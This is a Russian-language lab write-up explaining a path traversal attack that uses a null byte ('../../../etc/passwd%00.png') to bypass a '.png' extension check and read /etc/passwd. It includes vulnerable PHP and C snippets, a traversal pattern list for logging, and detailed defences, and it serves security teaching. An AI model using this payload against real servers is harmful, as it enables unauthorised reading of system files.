<a id="goal"></a>

## 🎯 Цель

Использовать уязвимость **File Path Traversal** в механизме отображения изображений товаров и получить содержимое системного файла:

```text
/etc/passwd
```

Приложение проверяет, что переданное имя файла **заканчивается на ожидаемое расширение**:

```text
.png
```

Для обхода проверки в параметр:

```text
filename
```

передаётся значение:

```text
../../../etc/passwd%00.png
```

Проверка расширения проходит, а нулевой байт `%00` обрезает строку в момент чтения файла, оставляя фактический путь:

```text
../../../etc/passwd
```

---

<a id="theory"></a>

## 🧠 Краткая теория

**Path Traversal** — это уязвимость, при которой пользователь может влиять на путь к файлу, читаемому сервером.

Приложение ожидает обычное имя изображения:

```text
filename=58.png
```

Сервер формирует путь примерно так:

```text
/var/www/images/58.png
```

Разработчик добавил проверку:

```text
имя файла должно заканчиваться на .png
```

Это отклоняет стандартный payload:

```text
../../../etc/passwd
```

Однако в легаси-бэкендах (PHP до версии 5.3.4, C/C++ приложения) строки обрабатываются как C-строки: их конец обозначается нулевым байтом `0x00`. Если передать такой байт внутри имени файла, файловая функция прочитает путь только до него, игнорируя всё после — включая проверенное расширение `.png`.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Стандартный payload:

```text
../../../etc/passwd
```

блокируется, потому что не заканчивается на `.png`.

Payload с реально существующим расширением:

```text
../../../etc/passwd.png
```

тоже не работает: файла `/etc/passwd.png` не существует, а путь интерпретируется буквально.

Рабочий вариант — добавить **null byte** перед расширением:

```text
../../../etc/passwd%00.png
```

Схема обработки:

```text
../../../etc/passwd%00.png
        ↓ URL-декодирование
../../../etc/passwd\x00.png
        ↓ проверка endswith(".png") — строка заканчивается на ".png"  ✅
        ↓ файловая функция (C-строка) останавливается на \x00
../../../etc/passwd
```

Проверка и исполнение видят **разные строки**: валидация — с суффиксом, файловая система — без него.

## 📁 Что такое Path Traversal

Path Traversal также называют:

```text
Directory Traversal
```

или:

```text
dot-dot-slash attack
```

Основная последовательность для Linux/Unix:

```text
../
```

означает:

```text
перейти в родительский каталог
```

Пример исходного каталога:

```text
/var/www/images/
```

После одного перехода:

```text
/var/www/
```

После двух:

```text
/var/
```

После трёх:

```text
/
```

Из корня атакующий может обратиться к:

```text
/etc/passwd
```

<a id="extension-validation"></a>

## 🧹 Что означает «проверка расширения файла»

Приложение требует, чтобы переданное имя файла заканчивалось на ожидаемое расширение:

```text
.png
```

Упрощённая проверка:

```python
if not filename.endswith(".png"):
    return "Access denied"
```

Это блокирует:

```text
filename=../../../etc/passwd
```

потому что строка не заканчивается на `.png`.

Но проверка смотрит только на **суффикс строки**. Она не контролирует, что именно будет прочитано файловой функцией, особенно если в строке есть символ завершения C-строки.

---

<a id="null-byte"></a>

## 💀 Что такое null byte

Null byte — это байт со значением:

```text
0x00
```

В URL-кодировании он передаётся как:

```text
%00
```

В C-строках нулевой байт обозначает **конец строки**. Все функции, работающие с C-строками (`fopen`, `stat`, `readfile`, `strlen` и т.д.), читают данные до первого `\x00` и игнорируют всё, что идёт после.

Именно поэтому null byte называют «терминатором строки».

<a id="payload-building"></a>

## 🔬 Как формируется рабочий payload

Берём классический traversal:

```text
../../../etc/passwd
```

Добавляем null byte:

```text
%00
```

Добавляем ожидаемое расширение:

```text
.png
```

Результат:

```text
../../../etc/passwd%00.png
```

Декодирование и обрезка:

```text
../../../etc/passwd%00.png
        ↓ %00 → \x00
../../../etc/passwd\x00.png
        ↓ C-строка: остановка на \x00
../../../etc/passwd
```

Проверка `endswith(".png")` видит полную строку и пропускает её. Файловая функция видит только `../../../etc/passwd`.

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика проверки

Упрощённая уязвимая реализация (легаси-бэкенд, PHP < 5.3.4):

```php
<?php
$filename = $_GET['filename'];
if (!preg_match('/\.png$/', $filename)) {
    die('Access denied');
}
$path = '/var/www/images/' . $filename;
readfile($path);   // обрезает строку на \x00
?>
```

Эквивалент на C-стиле:

```c
if (ends_with(filename, ".png")) {
    FILE *f = fopen(filename, "rb"); // fopen останавливается на '\0'
}
```

Уязвимая схема:

```text
Пользовательское имя файла
        ↓
endswith(".png") — проходит
        ↓
Передача строки в файловую функцию
        ↓
Обрезка строки по null byte (\x00)
        ↓
Реальный путь: ../../../etc/passwd
        ↓
Чтение /etc/passwd
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Пользователь контролирует имя файла

Параметр:

```text
filename
```

передаётся клиентом.

### 2. Проверяется только суффикс строки

Проверка `endswith(".png")` не анализирует содержимое пути до расширения.

### 3. Строка обрабатывается как C-строка

Файловая функция останавливается на первом нулевом байте `\x00`.

### 4. `%00` декодируется в null byte

URL-последовательность `%00` превращается в байт `0x00`, который и обрезает путь.

### 5. Проверка и исполнение видят разные значения

Валидация видит `../../../etc/passwd%00.png`, файловая система — `../../../etc/passwd`.

### 6. Итоговый путь не проверяется

Приложение не проверяет, что нормализованный путь остаётся внутри каталога изображений.

### 7. Процесс приложения может читать файл

Веб-приложение имеет право читать `/etc/passwd`, поэтому файл возвращается пользователю.

<a id="truncation"></a>

## 🧭 Как `%00` обрезает строку

Исходный payload:

```text
../../../etc/passwd%00.png
```

Шаг 1 — URL-декодирование:

```text
../../../etc/passwd%00.png
        ↓ %00 → \x00
../../../etc/passwd\x00.png
```

Шаг 2 — интерпретация как C-строка:

```text
../../../etc/passwd\x00.png
        ↓ чтение до первого \x00
../../../etc/passwd
```

Шаг 3 — нормализация пути:

```text
../../../etc/passwd
        ↓ три уровня вверх
/etc/passwd
```

Расширение `.png` и всё, что после null byte, просто игнорируется.

<a id="passwd"></a>

## 🐧 Почему используется `/etc/passwd`

`/etc/passwd` — стандартный файл Linux/Unix.

Он содержит информацию о локальных учётных записях.

Формат строки:

```text
username:x:UID:GID:comment:home:shell
```

Пример:

```text
root:x:0:0:root:/root:/bin/bash
```

Поля означают:

```text
root        имя пользователя
x           пароль хранится не здесь
0           UID
0           GID
root        описание
/root       домашний каталог
/bin/bash   командная оболочка
```

Важно:

```text
/etc/passwd обычно не содержит хеши паролей
```

Хеши паролей хранятся в:

```text
/etc/shadow
```

который доступен только привилегированным процессам.

В лаборатории `/etc/passwd` используется как безопасное доказательство произвольного чтения файлов.

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Использовать обычный `../` без расширения

Payload:

```text
../../../etc/passwd
```

блокируется проверкой расширения.

### Ошибка 2. Добавлять расширение без null byte

Payload:

```text
../../../etc/passwd.png
```

не находит файл — расширение воспринимается буквально.

### Ошибка 3. Передавать настоящий нулевой байт вместо `%00`

В запросе нужно передавать текстовую последовательность `%00`, а не символ `\x00`.

### Ошибка 4. Позволить Burp перекодировать `%00`

В Repeater значение должно оставаться как есть. Перед отправкой проверяйте исходную строку запроса.

### Ошибка 5. Забывать про легаси-контекст

Null byte работает только в бэкендах с C-строками (PHP < 5.3.4, C/C++). Современные рантаймы отклоняют такие пути.

### Ошибка 6. Смотреть только на HTTP status

Успешный и неуспешный запросы могут оба возвращать `200 OK`.

Нужно анализировать тело ответа.

### Ошибка 7. Ожидать JPEG

После эксплуатации сервер возвращает текст `/etc/passwd`, а не изображение.

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать путь от пользователя

Использовать идентификатор:

```text
image_id=58
```

и маппить его на сервере:

```python
allowed_images = {
    "58": "58.png",
    "59": "59.png",
}
```

### 2. Использовать allowlist

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Использовать современные рантаймы

Обновлённый PHP (5.3.4+), патченный JDK и другие современные платформы сами отклоняют null byte в путях файлов.

### 4. Отбрасывать управляющие символы

Блокировать на входе:

```text
%00
\x00
```

и другие управляющие символы (`\x00`–`\x1F`).

### 5. Нормализовать и проверять итоговый путь

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
if not target.startswith(base + os.sep):
    reject_request()
```

### 6. Использовать `basename` как дополнительную меру

```python
filename = os.path.basename(user_input)
```

### 7. Применять минимальные права

Веб-процесс должен уметь читать только необходимые файлы.

### 8. Логировать подозрительные значения

Примеры:

```text
../
%00
..%2f
%2e%2e%2f
```

Логирование помогает обнаруживать атаки, но не заменяет корректную валидацию.

<a id="conclusion"></a>

## 🧾 Итог

Приложение проверяло, что имя файла заканчивается на:

```text
.png
```

Однако оно не учитывало, что нижележащий слой обрабатывает строку как C-строку с нулевым терминатором.

Payload:

```text
../../../etc/passwd%00.png
```

прошёл проверку расширения, а нулевой байт обрезал строку до:

```text
../../../etc/passwd
```

Это позволило выйти из каталога изображений и прочитать:

```text
/etc/passwd
```

Главные выводы:

```text
Проверка строки и интерпретация пути — разные слои, и они могут видеть разные значения.
```

```text
Управляющие символы (null byte) должны отклоняться на входе.
```

```text
Валидация должна выполняться над итоговым каноническим путём.
```

```text
Нормализованный путь обязан оставаться внутри разрешённой базовой директории.
```
